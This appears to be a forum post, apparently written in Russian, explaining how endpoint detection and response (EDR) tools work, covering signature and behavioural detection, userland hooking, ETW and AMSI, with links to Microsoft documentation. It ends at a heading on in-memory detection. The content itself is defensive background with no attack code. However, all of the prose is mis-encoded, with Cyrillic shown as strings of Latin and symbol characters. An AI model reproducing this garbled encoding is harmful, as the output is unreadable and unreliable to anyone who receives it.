–£—Å—Ç–∞–Ω–æ–≤–∏–≤ EDR –Ω–∞ –∫–æ–Ω–µ—á–Ω—ã–µ —Ç–æ—á–∫–∏, –≤—ã –±—É–¥–µ—Ç–µ —Å–æ–±–∏—Ä–∞—Ç—å –¥–∞–Ω–Ω—ã–µ, –∫–æ—Ç–æ—Ä—ã–µ –∑–∞—Ç–µ–º –±—É–¥—É—Ç –∞–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å—Å—è –∏ –∫–æ—Ä—Ä–µ–ª–∏—Ä–æ–≤–∞—Ç—å—Å—è –¥–ª—è –≤—ã—è–≤–ª–µ–Ω–∏—è –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω—ã—Ö —É–≥—Ä–æ–∑. –ö–æ–≥–¥–∞ —É–≥—Ä–æ–∑–∞ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∞, —Ä–µ—à–µ–Ω–∏—è EDR –º–æ–≥—É—Ç –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —Ä–µ–∞–≥–∏—Ä–æ–≤–∞—Ç—å, –Ω–∞–ø—Ä–∏–º–µ—Ä, –∏–∑–æ–ª–∏—Ä—É—è –∑–∞—Ç—Ä–æ–Ω—É—Ç—É—é –∫–æ–Ω–µ—á–Ω—É—é —Ç–æ—á–∫—É –æ—Ç —Å–µ—Ç–∏ –∏–ª–∏ –ø—Ä–µ–¥–ø—Ä–∏–Ω–∏–º–∞—è –¥—Ä—É–≥–∏–µ –ø—Ä–µ–¥–æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–µ –¥–µ–π—Å—Ç–≤–∏—è, —Ç–∞–∫–∏–µ –∫–∞–∫ —É–¥–∞–ª–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤ –∏–ª–∏ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤.<br />
<br />
–ö—Ä–æ–º–µ —Ç–æ–≥–æ, EDR –±—É–¥—É—Ç –∑–∞–ø—É—Å–∫–∞—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º—ã –≤ –∏–∑–æ–ª–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö —Å—Ä–µ–¥–∞—Ö, –∞ –∑–∞—Ç–µ–º –ø—Ä–æ–¥–æ–ª–∂–∞—Ç –º–æ–Ω–∏—Ç–æ—Ä–∏—Ç—å –∏—Ö –Ω–∞ –ø—Ä–µ–¥–º–µ—Ç –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ø–æ–≤–µ–¥–µ–Ω–∏—è.<br />
<br />
EDR —Å–ª–µ–¥—É–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∫–∞–∫ —á–∞—Å—Ç—å –±–æ–ª—å—à–µ–π —Å—Ç—Ä–∞—Ç–µ–≥–∏–∏ –∫–∏–±–µ—Ä–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∏ –≤–º–µ—Å—Ç–µ —Å –¥—Ä—É–≥–∏–º–∏ —Ä–µ—à–µ–Ω–∏—è–º–∏, —Ç–∞–∫–∏–º–∏ –∫–∞–∫ —Ñ–∞–π—Ä–≤–æ–ª—ã, —Å–∏—Å—Ç–µ–º—ã –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –≤—Ç–æ—Ä–∂–µ–Ω–∏–π (IDS), —Å–∏—Å—Ç–µ–º—ã –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–µ–Ω–∏—è –≤—Ç–æ—Ä–∂–µ–Ω–∏–π (IPS) –∏ —Ä–µ—à–µ–Ω–∏—è –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π –∏ —Å–æ–±—ã—Ç–∏—è–º–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ (SIEM). –≠–∫—Å–ø–µ—Ä—Ç—ã –ø–æ –∫–∏–±–µ—Ä–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ —Ç–∞–∫–∂–µ –∏—Å–ø–æ–ª—å–∑—É—é—Ç –∂—É—Ä–Ω–∞–ª—ã EDR –¥–ª—è –ø–æ–∏—Å–∫–∞ —É–≥—Ä–æ–∑ –∏ IoC, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–≥–ª–∏ –±—ã –±—ã—Ç—å —É–ø—É—â–µ–Ω—ã —Ä–µ—à–µ–Ω–∏–µ–º.<br />
<br />
<b>–ö–∞–∫ —Ä–∞–±–æ—Ç–∞—é—Ç EDR</b><br />
<br />
–ê–≥–µ–Ω—Ç EDR –æ–±—ã—á–Ω–æ —Å–æ—Å—Ç–æ–∏—Ç –∏–∑ –¥–≤—É—Ö —á–∞—Å—Ç–µ–π: –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –≤ —Ä–µ–∂–∏–º–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏ –¥—Ä–∞–π–≤–µ—Ä–∞ –≤ —Ä–µ–∂–∏–º–µ —è–¥—Ä–∞. –≠—Ç–∏ —á–∞—Å—Ç–∏ —Å–æ–±–∏—Ä–∞—é—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é —Ä–∞–∑–ª–∏—á–Ω—ã–º–∏ —Å–ø–æ—Å–æ–±–∞–º–∏, —É–ø–æ–º—è–Ω—É—Ç—ã–º–∏ —Ä–∞–Ω–µ–µ.<br />
<br />
–°–æ–±—Ä–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –∑–∞—Ç–µ–º –∞–Ω–∞–ª–∏–∑–∏—Ä—É—é—Ç—Å—è –∏ —Å—Ä–∞–≤–Ω–∏–≤–∞—é—Ç—Å—è —Å —Å–∏–≥–Ω–∞—Ç—É—Ä–∞–º–∏ –∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–º –ø–æ–≤–µ–¥–µ–Ω–∏–µ–º. –û–±–Ω–∞—Ä—É–∂–∏–≤ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ –∏–ª–∏ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–æ–µ –ø–æ–≤–µ–¥–µ–Ω–∏–µ, EDR –±—É–¥–µ—Ç —Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å —ç—Ç–æ –≤ –ø–∞–Ω–µ–ª–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏. –ù–∞—Å—Ç—Ä–æ–π–∫–∏ EDR –æ—á–µ–Ω—å –Ω–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º—ã, –∏ –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –∏—Ö –Ω–∞—Å—Ç—Ä–æ–µ–∫ –æ–Ω –º–æ–∂–µ—Ç –ª–∏–±–æ –ø—Ä–µ–¥–ø—Ä–∏–Ω–∏–º–∞—Ç—å –¥–µ–π—Å—Ç–≤–∏–µ —Å–∞–º–æ—Å—Ç–æ—è—Ç–µ–ª—å–Ω–æ, –ª–∏–±–æ –ø—Ä–æ—Å—Ç–æ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è—Ç—å –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ù–∏–∂–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–æ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –∏–∑ –æ–¥–Ω–æ–π –∏–∑ —Å—Ç–∞—Ç–µ–π Microsoft, –ø–æ–∫–∞–∑—ã–≤–∞—é—â–µ–µ –ø–∞–Ω–µ–ª—å –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –¥–ª—è Microsoft Defender For Endpoint —Å –Ω–µ—Å–∫–æ–ª—å–∫–∏–º–∏ –æ–ø–æ–≤–µ—â–µ–Ω–∏—è–º–∏.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746795096801.png"
		data-src="https://osint42.org/attachments/1746795096801-png.312/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746795096801-png.312/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746795096801.png"
			title="1746795096801.png"
			width="1857" height="564" loading="lazy" />
	</div><br />
<br />
<b>–û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –ø–æ —Å–∏–≥–Ω–∞—Ç—É—Ä–∞–º–∏</b><br />
<br />
–ü–æ–º–Ω–∏—Ç–µ, —á—Ç–æ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å—ã, –∫–∞–∫ –ø—Ä–∞–≤–∏–ª–æ, –æ–≥—Ä–∞–Ω–∏—á–∏–≤–∞—é—Ç—Å—è –±–∞–∑–æ–≤—ã–º –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ–º –ø–æ —Å–∏–≥–Ω–∞—Ç—É—Ä–∞–º –∏ –º–æ–≥—É—Ç –±—ã—Ç—å –ª–µ–≥–∫–æ –æ–±–æ–π–¥–µ–Ω—ã. –•–æ—Ç—è EDR –Ω–∞–º–Ω–æ–≥–æ —Å–ª–æ–∂–Ω–µ–µ –∏ —Å–æ–¥–µ—Ä–∂–∏—Ç –±–æ–ª—å—à–µ —Ñ—É–Ω–∫—Ü–∏–π, –æ–Ω –≤–∫–ª—é—á–∞–µ—Ç –≤ —Å–µ–±—è —Ñ—É–Ω–∫—Ü–∏–∏ AV –¥–ª—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –∏–∑–≤–µ—Å—Ç–Ω–æ–≥–æ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û. –ë–æ–ª–µ–µ —Ç–æ–≥–æ, –∑–∞—â–∏—Ç–Ω–∏–∫–∏ –º–æ–≥—É—Ç —Ä–∞—Å—à–∏—Ä–∏—Ç—å –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è EDR, —Å–æ–∑–¥–∞–≤–∞—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–µ –ø—Ä–∞–≤–∏–ª–∞.<br />
<br />
<b>–û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –Ω–∞ –æ—Å–Ω–æ–≤–µ –ø–æ–≤–µ–¥–µ–Ω–∏—è</b><br />
<br />
–û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –Ω–∞ –æ—Å–Ω–æ–≤–µ –ø–æ–≤–µ–¥–µ–Ω–∏—è –∏ –≤ —Ä–µ–∞–ª—å–Ω–æ–º –≤—Ä–µ–º–µ–Ω–∏ - –æ–¥–Ω–∞ –∏–∑ –æ—Å–Ω–æ–≤–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π EDR. –û–Ω –º–æ–∂–µ—Ç –º–æ–Ω–∏—Ç–æ—Ä–∏—Ç—å –∑–∞–ø—É—â–µ–Ω–Ω—ã–µ –ø—Ä–æ—Ü–µ—Å—Å—ã –Ω–µ—Å–∫–æ–ª—å–∫–∏–º–∏ –º–µ—Ç–æ–¥–∞–º–∏, –∫–æ—Ç–æ—Ä—ã–µ —É–ø–æ–º–∏–Ω–∞—é—Ç—Å—è –Ω–∏–∂–µ.<br />
<br />
<b>–ü–µ—Ä–µ—Ö–≤–∞—Ç –≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–º —Ä–µ–∂–∏–º–µ (Userland Hooking)</b><br />
<br />
EDR –∏—Å–ø–æ–ª—å–∑—É—é—Ç –ø–µ—Ä–µ—Ö–≤–∞—Ç –≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–º —Ä–µ–∂–∏–º–µ –¥–ª—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤, –ø–µ—Ä–µ–¥–∞–Ω–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏—è–º, –∞ —Ç–∞–∫–∂–µ –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –ø–æ–ª–µ–∑–Ω—ã—Ö –Ω–∞–≥—Ä—É–∑–æ–∫ –ø–æ—Å–ª–µ –∏—Ö —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∏. –ù–∏–∂–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–Ω–æ–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ –∏–ª–ª—é—Å—Ç—Ä–∏—Ä—É–µ—Ç –ø–µ—Ä–µ—Ö–≤–∞—Ç –≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–º —Ä–µ–∂–∏–º–µ –≤ –¥–µ–π—Å—Ç–≤–∏–∏.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746795106550.png"
		data-src="https://osint42.org/attachments/1746795106550-png.313/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746795106550-png.313/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746795106550.png"
			title="1746795106550.png"
			width="1306" height="651" loading="lazy" />
	</div><br />
<br />
<b>–û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ —Å–æ–±—ã—Ç–∏–π –¥–ª—è Windows (ETW)</b><br />
<br />
ETW –∏–ª–∏ –û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ —Å–æ–±—ã—Ç–∏–π –¥–ª—è Windows - —ç—Ç–æ –º–µ—Ö–∞–Ω–∏–∑–º –≤ —Ä–µ–∂–∏–º–µ —è–¥—Ä–∞, –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã–π –≤ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω—É—é —Å–∏—Å—Ç–µ–º—É Windows, –∫–æ—Ç–æ—Ä—ã–π –æ—Ç—Å–ª–µ–∂–∏–≤–∞–µ—Ç –∏ –∑–∞–ø–∏—Å—ã–≤–∞–µ—Ç —Å–æ–±—ã—Ç–∏—è, –∫–æ—Ç–æ—Ä—ã–µ –∏–Ω–∏—Ü–∏–∏—Ä—É—é—Ç—Å—è –¥—Ä–∞–π–≤–µ—Ä–∞–º–∏ –∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è–º–∏ –≤ —Ä–µ–∂–∏–º–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–∞ —Ç–µ–∫—É—â–µ–π —Å–∏—Å—Ç–µ–º–µ.<br />
<br />
–°–ª–µ–¥—É—é—â–µ–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –≤–∑—è—Ç–æ –∏–∑ —Å—Ç–∞—Ç—å–∏ Microsoft &quot;–ò–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –≤–∞—à–µ–≥–æ –∫–æ–¥–∞ —Å –ø–æ–º–æ—â—å—é ETW&quot;, –Ω–∞ –∫–æ—Ç–æ—Ä–æ–º –ø–æ–∫–∞–∑–∞–Ω–∞ –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ ETW.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746795113875.png"
		data-src="https://osint42.org/attachments/1746795113875-png.314/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746795113875-png.314/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746795113875.png"
			title="1746795113875.png"
			width="1283" height="932" loading="lazy" />
	</div><br />
<br />
<b>–û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ —Å–æ–±—ã—Ç–∏–π –¥–ª—è Windows (ETW)</b><br />
<br />
ETW –º–æ–∂–µ—Ç —Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å —Å–æ–±—ã—Ç–∏—è, —Ç–∞–∫–∏–µ –∫–∞–∫ —Å–æ–∑–¥–∞–Ω–∏–µ –∏ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–∞, –∑–∞–≥—Ä—É–∑–∫–∞ –∏ –≤—ã–≥—Ä—É–∑–∫–∞ –¥—Ä–∞–π–≤–µ—Ä–æ–≤ —É—Å—Ç—Ä–æ–π—Å—Ç–≤, –¥–æ—Å—Ç—É–ø –∫ —Ñ–∞–π–ª–∞–º –∏ —Ä–µ–µ—Å—Ç—Ä—É, –∞ —Ç–∞–∫–∂–µ —Å–æ–±—ã—Ç–∏—è –≤–≤–æ–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è. –û–Ω —Ç–∞–∫–∂–µ –º–æ–∂–µ—Ç –∑–∞—Ö–≤–∞—Ç—ã–≤–∞—Ç—å —Å–µ—Ç–µ–≤—ã–µ —Å–æ–±—ã—Ç–∏—è, —Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä—É—è —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è –∏ –∑–∞–ø—Ä–æ—Å—ã –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏.<br />
<br />
EDR –º–æ–≥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —ç—Ç–æ—Ç –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã–π –º–µ—Ö–∞–Ω–∏–∑–º –¥–ª—è –¥–∞–ª—å–Ω–µ–π—à–µ–≥–æ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è —Å–≤–æ–∏—Ö –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–µ–π –ø–æ —Å–±–æ—Ä—É –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–π –∫–æ–Ω–µ—á–Ω–æ–π —Ç–æ—á–∫–µ. –° –¥—Ä—É–≥–æ–π —Å—Ç–æ—Ä–æ–Ω—ã, —Ç–∞–∫–∏–µ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã, –∫–∞–∫ Sysmon –∏ Procmon, —Ç–∞–∫–∂–µ –∏—Å–ø–æ–ª—å–∑—É—é—Ç ETW.<br />
<br />
<b>–ò–Ω—Ç–µ—Ä—Ñ–µ–π—Å —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –ø—Ä–æ—Ç–∏–≤ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û (AMSI)</b><br />
<br />
AMSI –∏–ª–∏ –ò–Ω—Ç–µ—Ä—Ñ–µ–π—Å —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –ø—Ä–æ—Ç–∏–≤ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û - —ç—Ç–æ –µ—â–µ –æ–¥–∏–Ω –º–µ—Ö–∞–Ω–∏–∑–º –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏, –≤—Å—Ç—Ä–æ–µ–Ω–Ω—ã–π –≤ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω—É—é —Å–∏—Å—Ç–µ–º—É Windows, –Ω–∞—á–∏–Ω–∞—è —Å Windows 10. –û–Ω –ø–æ–∑–≤–æ–ª—è–µ—Ç —Å—Ç–æ—Ä–æ–Ω–Ω–µ–º—É –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–º—É –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—é –∏–Ω—Ç–µ–≥—Ä–∏—Ä–æ–≤–∞—Ç—å—Å—è —Å –Ω–∏–º –∏ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞—Ç—å –∏ –æ–±–Ω–∞—Ä—É–∂–∏–≤–∞—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è.<br />
<br />
–°–ª–µ–¥—É—é—â–µ–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –≤–∑—è—Ç–æ –∏–∑ —Å—Ç–∞—Ç—å–∏ Microsoft &quot;–ö–∞–∫ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –ø—Ä–æ—Ç–∏–≤ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û (AMSI) –ø–æ–º–æ–≥–∞–µ—Ç –≤–∞–º –∑–∞—â–∏—â–∞—Ç—å—Å—è –æ—Ç –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û&quot;, –Ω–∞ –∫–æ—Ç–æ—Ä–æ–º –≤–∏–∑—É–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–∞ –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ AMSI.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746795124318.png"
		data-src="https://osint42.org/attachments/1746795124318-png.315/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746795124318-png.315/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746795124318.png"
			title="1746795124318.png"
			width="727" height="321" loading="lazy" />
	</div><br />
<br />
–° –ø–æ–º–æ—â—å—é AMSI –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–µ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏–µ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ —Å–ø–æ—Å–æ–±–Ω–æ –∞–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å —Å–∫—Ä–∏–ø—Ç—ã, –∫–æ–¥ –∏ —Å–±–æ—Ä–∫–∏ .NET, –∫–æ—Ç–æ—Ä—ã–µ –≤—ã–ø–æ–ª–Ω—è—é—Ç—Å—è –∏ –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏ –≤–Ω–µ–¥—Ä—è—é—Ç—Å—è, —Ç–∞–∫–∏–µ –∫–∞–∫ –Ω–∞–ø–∏—Å–∞–Ω–Ω—ã–µ –Ω–∞ JavaScript, VBScript, PowerShell –∏–ª–∏ –¥—Ä—É–≥–∏—Ö —è–∑—ã–∫–∞—Ö —Å—Ü–µ–Ω–∞—Ä–∏–µ–≤. –ö—Ä–æ–º–µ —Ç–æ–≥–æ, AMSI –º–æ–∂–µ—Ç —Å–∫–∞–Ω–∏—Ä–æ–≤–∞—Ç—å —Å–±–æ—Ä–∫–∏ .NET, –∫–æ—Ç–æ—Ä—ã–µ —è–≤–ª—è—é—Ç—Å—è –ø—Ä–æ–≥—Ä–∞–º–º–∞–º–∏, —Å–æ–∑–¥–∞–Ω–Ω—ã–º–∏ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Ñ—Ä–µ–π–º–≤–æ—Ä–∫–∞ Microsoft .NET –∏ –Ω–∞–ø–∏—Å–∞–Ω–Ω—ã–º–∏ –Ω–∞ C# –∏ VB.NET.<br />
<br />
AMSI –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —á–µ—Ä–µ–∑ –≥—Ä—É–ø–ø—É API, –∫–æ—Ç–æ—Ä—ã–µ Microsoft –∫–ª–∞—Å—Å–∏—Ñ–∏—Ü–∏—Ä—É–µ—Ç —Å–ª–µ–¥—É—é—â–∏–º –æ–±—Ä–∞–∑–æ–º:<br />
<br />
<a href="https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-enumerations" target="_blank" class="link link--external" rel="noopener">–ü–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏—è –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –ø—Ä–æ—Ç–∏–≤ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û</a> - –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏—è, –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–µ —ç–ª–µ–º–µ–Ω—Ç–∞–º–∏ –ø—Ä–æ–≥—Ä–∞–º–º–∏—Ä–æ–≤–∞–Ω–∏—è AMSI.<br />
<br />
<a href="https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-functions" target="_blank" class="link link--external" rel="noopener">–§—É–Ω–∫—Ü–∏–∏ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –ø—Ä–æ—Ç–∏–≤ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û</a> - —Ñ—É–Ω–∫—Ü–∏–∏, –∫–æ—Ç–æ—Ä—ã–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –º–æ–∂–µ—Ç –≤—ã–∑–≤–∞—Ç—å –¥–ª—è –∑–∞–ø—Ä–æ—Å–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è. –ù–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–∏ –Ω–∏–∂–µ –ø–æ–∫–∞–∑–∞–Ω—ã –¥–æ—Å—Ç—É–ø–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è AMSI.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746795153198.png"
		data-src="https://osint42.org/attachments/1746795153198-png.316/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746795153198-png.316/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746795153198.png"
			title="1746795153198.png"
			width="879" height="397" loading="lazy" />
	</div><br />
<br />
<a href="https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-interfaces" target="_blank" class="link link--external" rel="noopener">–û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ —Å–æ–±—ã—Ç–∏–π –¥–ª—è –ø—Ä–æ—Ç–∏–≤–æ–≤–∏—Ä—É—Å–Ω–æ–≥–æ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è (AMSI)</a> –ò–Ω—Ç–µ—Ä—Ñ–µ–π—Å—ã –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –ø—Ä–æ—Ç–∏–≤ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û - —ç—Ç–æ COM-–∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å—ã, —Å–æ—Å—Ç–∞–≤–ª—è—é—â–∏–µ API AMSI.<br />
<br />
<b>–û—Å–Ω–æ–≤–Ω–∞—è —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è API</b><br />
<br />
AMSI –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç—Å—è —á–µ—Ä–µ–∑ amsi.dll, –∫–æ—Ç–æ—Ä—ã–π —è–≤–ª—è–µ—Ç—Å—è –æ—Å–Ω–æ–≤–Ω–æ–π DLL, –∏—Å–ø–æ–ª—å–∑—É–µ–º–æ–π AMSI –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Å–≤–æ–∏—Ö –æ–ø–µ—Ä–∞—Ü–∏–π (—Å—Å—ã–ª–∞—è—Å—å –Ω–∞ –≤—ã—à–µ—É–ø–æ–º—è–Ω—É—Ç—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏). –ü–æ–¥—Å–∏—Å—Ç–µ–º–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏ —Å—Ç–æ—Ä–æ–Ω–Ω–∏–µ –ø—Ä–æ–¥—É–∫—Ç—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏, –∏–Ω—Ç–µ–≥—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Å AMSI, - —ç—Ç–æ –µ—â–µ –¥–≤–∞ –Ω–∞–±–æ—Ä–∞ DLL, –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã—Ö AMSI.<br />
<br />
<b>–û–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –≤ –ø–∞–º—è—Ç–∏</b><br />
<br />
